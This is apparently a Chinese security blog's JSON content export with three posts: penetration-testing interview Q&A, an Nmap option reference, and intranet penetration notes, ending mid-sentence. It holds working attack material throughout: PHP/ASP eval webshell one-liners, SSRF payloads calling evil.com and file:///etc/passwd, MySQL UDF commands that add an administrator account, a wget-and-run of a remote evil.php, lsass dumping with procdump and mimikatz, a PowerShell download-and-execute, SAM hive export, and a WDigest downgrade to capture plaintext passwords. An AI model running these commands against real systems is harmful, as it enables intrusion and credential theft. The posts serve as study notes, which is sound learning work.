{"meta":{"title":"Emerald Dream","subtitle":null,"description":"Freedom as Autonomy","author":"chessur","url":"https://chirec.github.io","root":"/"},"pages":[{"title":"categories","date":"2019-07-03T01:26:31.000Z","updated":"2019-07-03T01:27:12.905Z","comments":true,"path":"categories/index.html","permalink":"https://chirec.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-01T12:38:26.000Z","updated":"2019-07-01T12:38:55.177Z","comments":true,"path":"tags/index.html","permalink":"https://chirec.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"'面试问题'","slug":"Interview","date":"2019-07-06T12:46:50.000Z","updated":"2019-07-07T14:11:19.262Z","comments":true,"path":"2019/07/06/Interview/","link":"","permalink":"https://chirec.github.io/2019/07/06/Interview/","excerpt":"总结一下面试碰到的问题。","text":"总结一下面试碰到的问题。 SQL注入SQL注入时，注入点是数值型注入，不触发WAF的payload1.0、1/1、1*1 SQL注入可以做什么，写出针对于www.baidu.com?id=1的测试流程？SQL注入可以获取数据库信息，例如用户名、密码；可以删除或修改数据；向数据库添加数据，如添加管理员用户；在权限控制不够严格，拥有写入权限，并知道网站绝对路径时，可以写入Webshell；拥有读权限时，可以读取敏感文件，如select load_file(/etc/passwd) -- 测试流程a.测试是否存在注入，使用&#39;、&quot;、and 1=2等，根据页面是否发生变化判断是否存在注入，或使用sleep(5)根据页面加载速度判断是否存在注入 b.判断注入类型：Union、报错、布尔盲注、时间盲注、堆注入、内联注入 c.判断数据库类型：MySQL、Oracle、SQL Server 了解过哪些数据库的注入？Mysql、MSSQL、Oracle SQL注入可以采取什么方法修复？描述每种方法的利弊。使用参数化查询，增加额外的开发成本，程序不好维护 转义字符，只能转移部分字符，存在绕过风险 使用WAF，WAF规则库需要更新，存在绕过风险 宽字节注入的原理？前端编码和数据库编码不一致，数据库编码是GBK、GB2312这种两个字节表示一个字符的编码有转义函数，将&#39;转义为\\&#39; 二次编码注入的原理？服务器收到数据后会进行解码，mysql_real_escape_string()等转义函数在urldecode()前，所以无法转义经过编码后的字符，然后再由urldecode()进行解码。 渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。root权限、网站绝对路径、&#39;、:、/、\\ 二次注入的原理？数据库保存数据时，保存的是未经过滤的数据，在其他地方调用数据执行SQL查询，也未经过过滤，导致注入产生。 如果存在SQL注入怎么判断不同类型的数据库？不同数据库，存在独特的库，Mysql的information_schma，MSSQL的sysobjects，Oracle的dual，通过exists(select * from information_schma)来判断不同类型的数据库 查看报错信息，不同数据库的报错信息不同 报错注入的函数有哪些？extractvalue()、updatexml()、floor()、polygon()、exp() SQL注入的类型B(布尔盲注)、U(Union查询)、T(时间盲注)、S(堆注入)、E(报错注入)、Q(内联查询) 文件上传常见的一句话有哪些？木马的变形有哪些方式？PHP：&lt;?php eval($_POST[Windy]) ?&gt;ASP：&lt;%eval request(&quot;Windy&quot;)%&gt; 变形方式：将函数也作为参数从前端获取，将一句话的字符转为ascii码 文件上传漏洞的原理？没有对上传的文件进行严格验证和过滤 绕过文件上传的技巧有哪些?关闭JS修改Content-type修改拓展名修改文件头上传.htaccess文件 编辑器漏洞有了解码？FCKeditor EWebeditor 说说解析漏洞？Web中间件的漏洞，会造成解析不该解析的文件类型 IIS6.0 包含.asp后缀的文件夹下，所有文件以asp文件解析；会解析a.asa、a.cerIIS7.0 在图片后加入/.php会以php文件解析；会解析a.php;*.png的文件Apache 从右向左，依次尝试解析后缀，知道碰到认识的后缀 文件包含文件包含漏洞的原理，分类，条件？include()、require()中的参数用户可控，并无严格过滤 本地文件包含 远程文件包含 开启url_allow_fopen和url_allow_include 文件包含漏洞伪协议有哪些？php://inputphp://filterfile://phar://zip://data:// 命令执行、代码执行的原理？参数用户可控，调用命令执行、代码执行函数，未对参数进行过滤或过滤不严谨 XSSXSS可以做什么？写出不同场景下的Payload思路？1.网络钓鱼，包括盗取各类的用户账号2.窃取用户cookie3.窃取用户浏览会话4.强制弹出广告页面、刷流量5.网页挂马6.提升用户权限，进一步渗透网站7.传播跨站脚本蠕虫 XSS payload的变形方式？XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于&lt;www.baidu.com?id=1&gt;的测试流程？反射型，非持久型，需要用户点击恶意链接才能触发 存储型，持久型，用户访问存在XSS的页面即可触发 DOM型，可以改变网页DOM节点，将XSS链接伪装成正常链接 XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？前端过滤：移除用户上传的高危标签输出编码：HTML编码 搜索业务会显示搜索内容， 博客会有留言、分享、私信 XSS获取屏幕截图，屏幕截图的范围浏览器解析范围 简述下浏览器的自解码机制。URL编码、HTML编码、JavaScrip编码 浅谈XSS—字符编码和浏览器解析原理 网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取CookieHTTP-Only，设置之后，Cookie无法在JavaScript中获取到，只会通过HTTP协议传输过程中带到服务器。 使用XSS获取phpinfo页面信息中的Header数据，Header数据中会存在HTTP-Only的Cookie 支持TRACE方法的服务器、CVE-2012-0053(Apache 2.x)，CVE-3009-0357(FireFox) HTTP-Only绕过姿势HttpOnly的那些事 CSRFCSRF漏洞的原理是什么？怎么修复？原理：攻击者构造链接，诱导受害者点击，受害者点击后使用自身的身份验证向服务器发送请求。修复：验证rerfer、token、向用户发送验证码，其中向用户发送验证码这种二次验证最为有效，可以和前两种组合使用 XXEXXE漏洞原理以及利用方式？中间件开启XML解析组件，并且没有关闭解析外部实体。 SSRFSSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。扫描内部网络和端口：url=http://10.0.0.0:80 执行拒绝服务，请求大文件，保持连接Keep-Alive Always url=http://evil.com/big_file 攻击内网：向内部任意主机的任意端口发送Payload，攻击内网Web应用(使用GET方法可以实现的攻击，如Strust2，SQLi) url=http://192.168.126.1/index.php?id=1 and sleep(5) 利用file协议读取本地文件 url=file:///etc/passwd 利用gopher协议反弹shell 需要结合Redis未授权访问 使用Redis写入脚本，再捕获数据，使用脚本转换为gopher格式，再使用gopher协议反弹shell 从其他服务器获取数据的功能的地方(图片、文档) 在线翻译 收藏 SSRF漏洞修复方案怎么做，难点在哪？白名单-允许指定URL的HOST 限制内网IP 限制协议为HTTP、HTTPS，禁止file:///，gopher://，ftp://，dict:// 禁止30X跳转 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态 SSRF绕过方式@IP 反序列化漏洞反序列化漏洞有哪些？是否懂原理？PHP反序列漏洞、Java反序列化漏洞 内网欺骗和嗅探的原理？工具？计算机之间通信通过MAC地址，但对获得的MAC地址不做验证，直接记录，所以可以发送ARP包达到欺骗的目的 Ettercap 域虚拟机VMWare的网络模式NAT HostOnly 桥接 Web容器Web容器有哪些？Apache-HTTP ServerApache TomcatNginxWeblogicWebSphereLighttpdJBoss HTTP协议HTTP请求方式有哪些？GET、POST、TRACE、DELETE、PUT、HEAD、OPTION 状态码1XX 需要用户进一步请求2XX 请求成功3XX 重定向4XX 客户端请求错误5XX 服务端错误200302403 访问禁止404 文件不存在500 服务器内部错误 在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？user-agent 客户端使用的浏览器、操作系统 安全设备WAF绕过的方法有哪些？大小写，双写，内联注释，编码，等价函数替换，分块传输， 哪些漏洞WAF防御不了？0day，因为WAF基于特征码来进行阻断，0day的特征码 绕过WAF，进入内网执行的漏洞 加密的流量 绕过WAF规则 逻辑漏洞 信息泄露 MiscSession和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？Session是存放在服务器的身份凭证，Session没有限量 Cookie是存放在本地浏览器上的身份凭证，Cookie限制了数据量，只允许4KB Cookie伪造原理，获取用户的Cookie后，服务器对发送的Cookie进行验证，验证通过即登录账户，使用HTTP-Only Session伪造，给被攻击者发送一个伪造的Session，使其登录，可以使用这个Session登录，修复，在登录后重置SessionID 什么是指纹识别？可以用来识别Web服务类型的独特特征，会在响应包中返回网页中关键字、特定文件的Hash值(主要是静态文件)指定URL的关键字指定URL的Tag模式 浅谈web指纹识别技术 写过博客吗？日常的学习过程关注哪些安全平台？后期工作规划？薪资待遇有什么想法？之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？渗透流程拿到目标站怎么进行渗透，需要注意什么。查询目标站的IP地址，如果存在CDN，可以通过查询SSL证书，查询域名解析历史记录，从国外访问查询IP等方法查询真实IP；知道目标站真实IP后，进行IP反查，查询是否存在旁站，查询C段网站，若目标站不好渗透，可以从旁站下手；对目标网站的IP扫描开放端口，查看各个服务版本，以及各服务的第三方组件信息；对目标网站进行漏洞分析，查找目标网站的Web漏洞；对找到的漏洞，进行漏洞利用；若目标网站未找到可利用漏洞，可以继续寻找旁站和C段的漏洞；使用漏洞获得Webshell后，对目标服务器的系统信息进行收集，收集系统补丁信息，系统版本信息，第三方软件版本信息，安全配置信息等系统信息；同时收集内网信息，使用代理或端口转发对内网进行扫描，为内网渗透做准备；对上一步收集到的信息进行分析，进行提权；若无法提权，寻找内网中另一台机器，继续进行渗透；在获取权限后，做后渗透攻击；撰写渗透测试报告，报告加密发送。 CDN技术有了解码？如何绕过CDN寻找站点真实IP？CDN(内容分发网络，Content Delivery Network) 代码审计代码审计怎么做？查看敏感函数、高危函数、敏感功能点、可控变量 代码审计的方法和常规步骤？都会哪些语言？PHPPHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？&#39;、&quot;、\\ 工具用过哪些扫描工具，各有什么特点以及区别？AWVS 扫描Web漏洞Nessus 扫描服务器漏洞，专业版可以导出中文报告Appscan 扫描Web漏洞，支持导出中文报告 Nmap中，-sT，-sP，-sA，-oN分别表示什么？-sT表示TCP方式扫描，对目标端口建立连接，会留下连接记录-sP表示Ping方式扫描-sA表示TCP ACK方式扫描-oN表示标准输出 对Nmap的脚本引擎了解吗？–script 使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。--os-shell SQLMAP中指定测试参数用什么命令？-p &quot;parameter&quot; SQLMAP中POST型注入怎么注入？1.保存POST请求包，然后使用-r request.txt2.--data=请求数据 SQLMAP中查询所有用户的角色？查询所有用户--users查询角色--roles 暴力破解工具有哪些？B/S？C/S？破解Hash密码的方式？彩虹表 提权提权分类？内核提权第三方服务安全配置不当 MySQL提权分几种，不同系统有什么差异？a.MOF提权 在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。 利用条件：mysql用户具有root权限，关闭了secure-file-priv b.UDF提权 UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限 利用条件：Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下。Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\\windows\\system32，在windows2000下放置于c:\\winnt\\system32。掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。以将udf.dll写入到相应目录的权限。 利用方式：将dll文件导入到相应目录，如果导入错误会产生can’t open shared library错误创建自定义函数 12345create function cmdshell returns string soname &apos;udf.dll&apos;;select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);select cmdshell(&apos;net localgroup administrators miao /add&apos;);drop function cmdshell; #删除函数delete from mysql.func where name=&apos;cmdshell&apos; #删除函数 Windows系统和Linux系统上的DLL库位置不同 sqlmap找到Mysql插件目录 12python sqlmap.py -u &quot;http://&quot; --sql-shellshow variables like &quot;%plugin%&quot; 利用sqlmap上传lib_mysqludf_sys到MySQL插件目录 1python sqlmap.py -u &quot;http://&quot; --file-write=/lib_mysqludf_sys.so --file-dest=/usr/lib/mysql/plugin/ 激活存储过程sys_exec函数 1234python sqlmap.py -u &apos;http://xxxx&apos; --sql-shellCREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.soSELECT * FROM information_schema.routinessys_exec(id); 利用sqlmap上传后门程序 1python sqlmap.py -u &apos;http://xxx&apos; --file-write=C:/phpspy.php --file-dest=/var/www/spy.php c.mysql5.x for Linux下有system函数，可以执行命令 1234mysql&gt;system vi /etc/httpd/conf/httpd.conf;mysql&gt;system wget http://baidu.com/evil.phpmysql&gt;system chmod +x evil.phpmysql&gt;system ./evil.php 可以下载MSF生成的反弹shell脚本，本地运行反弹shell，权限根据启动mysql的用户身份来决定 具体场景考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？CSRF、越权 有文件包含，但没有上传点的站怎么GetShell？访问含有一句话的URL，会记录在日志里，文件包含日志PHP伪协议","categories":[],"tags":[]},{"title":"'Nmap-Usage'","slug":"Nmap-Usage","date":"2019-06-09T00:48:33.000Z","updated":"2019-07-04T11:22:45.064Z","comments":true,"path":"2019/06/09/Nmap-Usage/","link":"","permalink":"https://chirec.github.io/2019/06/09/Nmap-Usage/","excerpt":"Nmap一些参数的具体作用","text":"Nmap一些参数的具体作用 目标说明1234-iL &lt;inputfilename&gt; 读取文档-iR &lt;hostnum&gt; 随机选择目标--exclude &lt;host1[,host2][,...]&gt; 排除主机/网络--excludefile &lt;excludefile&gt; 排除文件中的列表 主机发现123456789101112-sL 列表扫描-sP ping扫描-P0 默认主机存活-Pn 默认主机存活和-P0相同-PS [portlist] TCP SYN Ping-PA [portlist] TCP ACK PING-PU [portlist] UDP Ping-PE;-PP;-PM ICMP Ping Types-PR ARP Ping-n 不用域名解析-R 为所有目标解析域名--system-dns 使用系统域名解析器 端口扫描基础端口状态 名称 状态 open 开放 closed 关闭 filtered 被过滤的 unfiltered 未被过滤的 open or filtered 开放或被过滤的 closed or filtered 关闭或被过滤的 端口扫描技术-sSTCP SYN扫描，半开放扫描 -sTTCP Connect扫描，用户没有权限发送原始报文或扫描IPv6时，Nmap默认使用该扫描方式。Nmap调用connect()对目标端口建立连接，这种方式会花费更长的时间、会在目标机留下连接记录。 -sUUDP扫描，可以和TCP扫描同时使用检查两种协议。 扫描比较慢，Linux 2.4.20内核限制一秒钟只发送一条目标不可到达消息。加速UDP扫描，可以并发扫描更多的主机，先只对主要端口进行快速扫描，从防火墙后面扫描，使用--host-timeout跳过慢速的主机。 -sNTCP Null 扫描不设置任何标志位(tcp标志头是0) -sFTCP FIN 扫描只设置TCP FIN标志位 -sXXmas 扫描设置FIN，PSH，URG标志位，就像点亮圣诞树上所有的灯一样 -sN,-sF,-sX都基于TCP RFC来区分open和closed端口。IDS可以发现这三种方式，而且并不是所有系统都严格遵循RFC 793，例如Microsoft Windows,Cisco,BSDI,IBM OS/400，不过Unix系统都能工作。这三种模式无法区分open还是filtered -sATCP ACK扫描不能区分open和open|filtered端口。用于发现防火墙规则，确定它们是有状态还是无状态，哪些端口是被过滤掉的。当扫描未被过滤的系统时，open(开放的)和closed(关闭的) 端口都会返回RST报文。Nmap把它们标记为 unfiltered(未被过滤的)，意思是 ACK报文不能到达，但至于它们是open(开放的)或者 closed(关闭的) 无法确定。不响应的端口或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的) -sWTCP窗口扫描TCP窗口值为整数，表示端口开启，TCP窗口值为0表示端口关闭 -sMMainmon扫描和-sN,-sF,-sX方式完全一样，除了探测报文是FIN/ACK –scanflags 定制的TCP扫描--scanflags选项可以指定任意TCP标志位来设计扫描。 1--scanflags URGACKPSHRTSSYNFIN -sITCP端口盲扫描，没有报文从真实的IP地址发送到目标 1-sI &lt;zombie host[:probeport]&gt; 默认端口80可以尝试使用可能被信任的zombies扫描目标 端口说明和扫描顺序默认情况下，Nmap用指定的协议对端口1-1024以及nmap-services文件中列出的更高的端口进行扫描 -p只扫描指定的端口 12-p &lt;port ranges&gt;-p 21-25,80 -F快速，有限的端口扫描只扫描nmap-services文件中的端口 -r不要按随机顺序扫描端口Nmap默认按随机顺序扫描端口，使用-r来顺序端口扫描 服务和版本探测-sV版本探测也可使用-A同时打开操作系统探测和版本探测 –allports不为版本探测排除任何端口 --version-intensity设置 版本扫描强度 1--version-intensity &lt;intensity&gt; 强度：1-9 默认为7数值越高，服务越有可能被正确识别，高强度扫描花费更多的时间。 --version-light打开轻量级模式，是--version-intensity 2的别名 --version-all--version-intensity 9的别名 --version-trace跟踪版本扫描活动Nmap打印出详细的关于正在进行的扫描的调试信息 -sRRPC扫描可以与许多端口扫描方法联合使用，对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来确定他们是否有RPC端口并确定程序和版本号。 操作系统探测--O启动操作系统检测也可以使用-A来同时启动操作系统检测和版本检测 --osscan-limit针对指定的目标进行操作系统检测 --osscan-guess--fuzzy推测操作系统检测结果 时间和性能防火墙/IDS躲避和哄骗-f报文分段 --mtu使用指定的MTU -f和-mtu都是将数据包分段的参数，-f使用一次是将包分成8字节或更小，使用两次是将包分为16字节的分段。使用-mtu可以自定义偏移的大小，偏移量必须是8的倍数。一些网络会禁止分段包进入网络 -D使用诱饵隐蔽扫描 1-D &lt;decoy1 [,decoy2] [,ME],...&gt; 为使诱饵扫描起作用，需要使远程主机认为是诱饵在扫描目标网络。使用逗号分隔每个诱饵主机，也可用真实IP作为诱饵，这时可使用 ME选项说明。如果在第6个位置或更后的位置使用ME选项，一些常用端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告 这个真实IP。如果不使用ME选项，Nmap将真实IP放在一个随机的位置 -S源地址哄骗 1-S &lt;IP_Address&gt; -e使用指定的网卡 1-e &lt;interface&gt; 源端口哄骗12--source-port &lt;portnumber&gt;-g &lt;portnumber&gt; MAC地址哄骗1--spoof-mac &lt;mac address,prefix,or vendor name&gt; 使用字符串&quot;0&quot;，Nmap会选择一个完全随机的MAC地址。 --data-length发送报文时，附加随机数据 1--data-length &lt;number&gt; --ttl设置IPV4报文的time-to-live域 1--ttl &lt;value&gt; --randomize-hosts对目标主机的顺序随机排列 输出-oN标准输出 1-oN &lt;filename&gt; -oXXML输出 1-oX &lt;filename&gt; -oGGrep输出 1-oG &lt;filename&gt; -oA输出至所有格式 1-oA &lt;basename&gt; -v提高输出信息的详细度 -d提高或设置调试级别 1-d [level] --packet-trace跟踪发送和接收的报文 要求Nmap打印发送和接收的每个报文摘要。为了避免输出过多的行，可以限制扫描的端口数，如-p 20-30，如果只需进行版本检测，使用--version-trace --iflist列举接口和路由 --append-output在输出文件中添加 --resume继续中断的扫描 1--resume &lt;filename&gt; --stylesheet设置XSL样式表，转换XML输出 --no-stylesheet忽略XML声明的XSL样式表 其他选项-6启用IPv6扫描 -A操作系统检测和版本扫描 打印版本信息12-V--version 帮助信息12-h--help","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/categories/工具使用/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'内网渗透'","slug":"Intranet-Infiltration","date":"2019-06-01T06:31:25.000Z","updated":"2019-07-05T03:01:25.842Z","comments":true,"path":"2019/06/01/Intranet-Infiltration/","link":"","permalink":"https://chirec.github.io/2019/06/01/Intranet-Infiltration/","excerpt":"最近在学习内网渗透，整理一些关于内网渗透的文章","text":"最近在学习内网渗透，整理一些关于内网渗透的文章 信息收集内网渗透需要不断收集网络信息&amp;系统信息&amp;应用信息&amp;硬件信息，在用系统自带的命令加参数列表构成多功能查询或者第三方应用软件多维度查询，得到想要的目标结果，上一个命令为下一个命令做铺垫，环环相扣，最终集合全部有效的结果集，在进行内网渗透下一阶段实行动作做准备。 通用信息网络配置信息查看接入的网段，网关，子网掩码 使用Kali下的nbtscan工具获取主机名 1nbtscan -r 192.168.126.0/24 网络环境网络拓扑与外网的连通性与内网其他网段的连通性与外网之间是否有端口访问限制与内网其他网段之间是否有端口访问限制 存活IP对内网进行扫描需要做代理 F-NAScan GitHub地址：https://github.com/ywolf/F-NAScan netdiscover Kali自带，扫描存活主机 nbtscan 1nbtscan -r 1192.168.126.0/24 nmap123456#nmap发现存活主机nmap --script discovery 192.168.126.0#nmap 同网段优先使用arp探测nmap -R 192.168.126.0/24#nmap 跨网段ICMP探测nmap -sP 192.168.127.0/24 nmap-vulners下载地址：https://github.com/vulnersCom/nmap-vulners 需要在Nmap目录下下载 12#nmap vulner脚本扫描nmap --script=nmap-vulners -sV 192.168.126.126 nmap-vulscan利用本地的配置文件来检索CVE漏洞信息 下载地址：https://github.com/scipag/vulscan 需要在Nmap目录下下载 查看本地的配置文件 123cd vulscan/utilities/updaterchmod +x updateFiles.sh./updateFiles.sh 使用 1234567#nmap vulscan 脚本nmap --script vulnscan -sV 192.168.126.126#一次只能查询一个数据库，可以使用vulscandb参数添加数据库nmap --script vulscan --script-argsvulscandb=database_name -sV 192.168.126.126nmap --script vulscan --script-argsvulscandb=exploitdb.csv -sV 192.168.126.126nmap –script vulscan –script-argsvulscandb=scipvuldb.csv -sV 192.168.126.126nmap –script vulscan –script-argsvulscandb=securitytracker.csv -sV 192.168.126.126 敏感信息数据库密码 浏览器保存密码 浏览器历史记录 远程桌面历史记录 键盘记录 Windows网络信息1234567891011ipconfig /allarp -aroute print #打印路由表net viewnet session #查看远程连过来的sessiondsquery | nltest #域内信息收集nbtstat -A #查询内网存活主机tracert ip #跟踪目标主机nbtscan -r ip #查看内网主机(需要安装)netsh firewall show config #查看防火墙默认配置策略netsh advfirewall firewall show rule name=all #查看防火墙规则 域信息1234567891011121314151617181920212223242526272829303132333435dsquery server #查询域中所有服务器dsquery computer #查看域中所有的机器dsquery user #查看域中所有账户名dsquery group #查看域中所有的组名dsquery subnet #查看当前域所在的网段dsquery site #查看域中网站dsquery user domainroot -name admin* -limit 240 #查看240个以admin开头的用户名net group &quot;domain controller&quot; /domain #获取域控主机名ping hostname #获取主机名对应IPnet group /domain #查询域中的所有组名net group &quot;domain admins&quot; /domain #查询域管理用户net group &quot;domain computers&quot; /domain #查询域内所有主机名net group &quot;domain controllers&quot; /domain #查看域控net user domain-admin /domain #查看管理员登录时间，密码过期时间，是否有登录脚本，组分配等信息net user /domain #查询域用户net time /domain #查看域时间，以及与服务器的名字,一般都会把主域作为时间服务器net localgroup administrators /domain #查询域管理员用户组net localgroup administrators workgroup\\username /add #域用户添加到域管理员用户组net view /domain #查询域列表net view /domain:domainname #查看域中计算机列表net user uesername /domain #获取指定账户信息net config workstation #查询当前登录域net accounts /domain #获取域密码策略设置nltest /dsgetdc:domainname #找域控nltest /dclist:domainname-a #pdc是主域控nltest /domain_trusts #列出域之间的信任关系findstr /si password *.ini *.txt *.asp *.cgi findstr /si password *.ini *.txt *.aspx findstr /si password *.ini *.txt *.phpfindstr /si password *.ini *.txt *.php *.xml 端口信息12netstat -ano #查看端口开启情况netsh #端口转发 系统信息12345678systeminfohostnamesetnet statistics workstationnet sharecmdkey /l #查看是否保存了登录凭证net statistics server #查看登录时间wmic os 安装信息123wmic qfe #查看补丁信息powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; #查看安装软件wmic product #查看安装软件 在Windows XP下，低权限用户不能使用WMIC命令 进程信息1tasklist /svc 用户信息1234567net usernet localgroupquery usernet config workstation #查看当前登录用户信息whoamiwhoami /all #查看是否过UACspn -l username #查看域内某个用户的SPN记录 敏感文件1dir/b/s config.* #查看所有config配置文件 密码HashWindows下使用mimikatz 从SAM中提取目标系统本地用户密码Hash使用reg将sam、system和security文件导出来，并拖回本地。 1234cd Desktopreg save HKLM\\SYSTEM system.hivreg save HKLM\\SAM sam.hivreg save HKLM\\SECURITY sercrity.hiv PS：本地复原机器与目标机器需一致。 通过dump lsass.exe进程数据离线免杀抓取明文1.procdump.exe12C:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits 本地还原 123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full 2.PowerShell123powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&apos;);&quot;Get-Process lsass | Out-Minidump&quot;//或者本机执行powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\\Users\\Public\\Out-Minidump.ps1&apos;; Get-Process lsass | Out-Minidump&#125;&quot; 3.SqlDumper如果目标系统上安装了Windows SQL Server，SqlDumper.exe默认存放在c:\\Program Files\\Microsoft SQL Server\\number\\Shared，其中number代表sql server的版本。 123456140 for SQL Server 2017130 for SQL Server 2016120 for SQL Server 2014110 for SQL Server 2012100 for SQL Server 200890 for SQL Server 2005 当然，如果没有安装有Windows SQL Server的话，可以自己上传一个SqlDumper.exe上去。 使用方法： 12345678910111213141516171819202122232425262728293031323334c:\\Users\\Public&gt;tasklist /svc |findstr lsass.exe&quot;lsass.exe 512 SamSsc:\\Users\\Public&gt;SqlDumper-2016.exe 512 0 0x01100Parsed parameters: ProcessID = 512 ThreadId = 0 Flags = 0x120 MiniDumpFlags = 0x1966 SqlInfoPtr = 0x0000000000000000 DumpDir = &lt;NULL&gt; ExceptionRecordPtr = 0x0000000000000000 ContextPtr = 0x0000000000000000 ExtraFile = &lt;NULL&gt; PatternForExtraFiles = &lt;NULL&gt; InstanceName = &lt;NULL&gt; ServiceName = &lt;NULL&gt;Remote process didn&apos;t specify a dump file nameTarget suspendedCallback type 11 not usedCallback type 15 not usedCallback type 7 not usedMiniDump completed: SQLDmpr0001.mdmpTotal Buffer pool data pages filtered out: 0 KBTotal Hekaton data pages filtered out: 0 KBTotal Free memory (from non top level allocators) filtered out: 0 KBTotal top level free memory filtered out: 0 KBTotal Log pool memory filtered out: 0 KBLocation of module &apos;dbghelp.dll&apos; : &apos;C:\\Windows\\system32\\dbghelp.dll&apos;File version of module &apos;C:\\Windows\\system32\\dbghelp.dll&apos; : &apos;6.1:7601.17514&apos;Product version of module &apos;C:\\Windows\\system32\\dbghelp.dll&apos; : &apos;6.1:7601.17514&apos;GetModuleHandle () Failed 0x7e - The specified module could not be found.Watson Invoke: No windows 10 / 2012r2 以后系统的明文密码抓取方式在windows 10 / 2012之后的系统版本中，默认情况下是禁用了在内存缓存中存储系统用户明文密码。此时使用mimikatz去抓取密码，会显示null，通过修改注册表来获取明文密码。 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential 改为1即可 通过PowerShell： 修改注册表键值为“1”： 1PS C:\\&gt; New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 1 锁定目标PC： 123456789PS C:\\&gt; Function Lock-WorkStation &#123;$signature = @&quot;[DllImport(&quot;user32.dll&quot;, SetLastError = true)]public static extern bool LockWorkStation();&quot;@$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru$LockWorkStation::LockWorkStation() | Out-Null&#125;Lock-WorkStation 抓取目标系统解锁事件： 1PS C:\\&gt; Register-wmievent -query &quot;SELECT * FROM Win32_ProcessStopTrace WHERE ProcessName = &apos;LogonUI.exe&apos;&quot; -Action $actionblock 以上的这些操作，我们只需通过 Invoke-MimikatzWDigestDowngrade.ps1 这个 powershell 脚本就能轻松实现。 Linux系统信息1234uname -a #查看内核版本uname -rcat /proc/version getconf LONG_BIT #查看操作系统位数 网络信息12345ifconfignetstat -antlupnetdiscover -r ipnmapmasscan ip -p -banners 敏感文件1234567/etc/passwd/etc/shadow/var/log/history.bash_history.ssh... 进程信息1234topps auxapt listchkconfig --list 提权打算写到另一篇文章里 端口转发适用端口转发的网络环境有以下几种： 1.服务器处于内网，可以访问外部网络2.服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接3.服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络 对于以上三种情况，lcx可以突破1和2二种，但是第3种就没有办法了，因为lcx在使用中需要访问外部网络 Socket端口转发lcxlcx是一个基于Socket套接字实现的端口转发工具，它是从Linux下的Htran工具移植到Windows平台的一条正常的Socket隧道必须具备两端，一端为Server，它会监听一个端口等待Client连接；另一端为Client，通过传入Server的IP和端口，才能主动连接到服务器 Server这里的Server端，也是目标服务器 1lcx -slave 126.126.126.126 12600 10.10.10.10 3389 将目标服务器3389端口所有的数据都转发到公网VPS的12600端口上 VPS在VPS上执行 1lcx -listen 12600 126 将VPS 12600端口所有的数据转发到本机的126端口上 Client这里的Client，也是攻击机 在完成上述操作之后，可以在Client上用mstsc登录VPS的12600端口，或直接在VPS上用mstsc登录本机的126端口，即可访问Server(目标服务器)的3389端口 lcx工具实现的是一对一端口转发，如果想要对内网进行扫描，就需要将目标服务器的所有端口进行端口转发，整个过程非常耗费时间，而且都是重复操作 这种情况下，就需要Socks代理 SSH隧道编辑/etc/ssh/sshd_config文件（服务器端）中： 12345GatewayPorts yesPermitRootLogin yesPermitTunnel yes #Tunnel启用ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开 接着重启ssh服务 参数详解： 123456789-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了～-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn 